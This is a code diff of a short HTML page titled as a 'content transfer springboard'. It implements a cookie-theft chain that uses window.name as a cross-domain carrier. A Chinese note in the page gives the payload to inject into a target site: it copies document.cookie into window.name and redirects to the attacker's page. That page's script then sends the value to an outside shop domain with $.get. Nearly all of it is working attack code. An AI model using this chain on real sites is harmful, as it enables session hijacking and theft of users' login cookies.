@@ -1,10 +1,19 @@
+<html>
+  <head>
+    <title>内容传输跳板</title>
+  </head>
 <body>
   
+  <script src="http://s.maiyaole.com/js/??search/jquery-1.8.3.min.js" ></script>
+
   <script>
-  alert(document.domain+"    "+window.name);
-  $.get("https://shop.gate.panda.tv/goods/list?toneup="+window.name)
+    $.get("https://shop.gate.panda.tv/goods/list?toneup="+window.name)
   </script>
 
   window.name作为传递数据的载体, 在这个站
+  <pre>
+    需要将window.name=document.cookie;window.location="http://wangtongphp.github.io/3.html";注入目标站
+  </pre>
 
 </body>
+</html>
